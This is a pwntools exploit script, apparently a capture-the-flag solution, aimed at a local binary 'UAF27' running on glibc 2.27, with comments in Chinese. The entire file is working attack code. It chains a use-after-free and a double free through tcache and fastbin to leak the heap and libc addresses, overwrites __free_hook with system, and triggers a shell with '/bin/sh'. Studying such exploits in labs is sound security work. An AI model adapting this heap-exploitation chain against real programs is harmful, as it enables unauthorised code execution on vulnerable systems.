#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF27')
libc = ELF('./libc-2.27.so')
elf = ELF('./UAF27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x40) #0
add(0x40) #1 0x2a0
add(0x40) #2

#填满tcachebin
for i in [1,0,1,0,1,0,1]:
	delete(i)

delete(1) #double free 放入 fastbin
show(0)
heapbase = u64(p.recv(6).ljust(8, "\x00")) - 0x2a0
pr('heapbase',heapbase)

edit(1, p64(heapbase +0x290))
add(0x40) #3 use chunk1
add(0x40) #4 fastbin分配去 chunk1-0x10
edit(4, p64(0)+p64(0xa1)) #修改chunk1 size = 0xa0

add(0x20) #5 防止与top合并
#填满tcachebin
for i in range(7):
	delete(1)

delete(1) #unsortedbin

show(1)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
pr('libcbase',libcbase)

#分割unsortedbin
add(0x50) #6
add(0x30) #7
edit(7, '/bin/sh')

delete(6) #tcachebin
edit(6, p64(free_hook))
add(0x50) #8
add(0x50) #9
edit(9, p64(system))

#gdb.attach(p)
#pause()

delete(7)
p.interactive()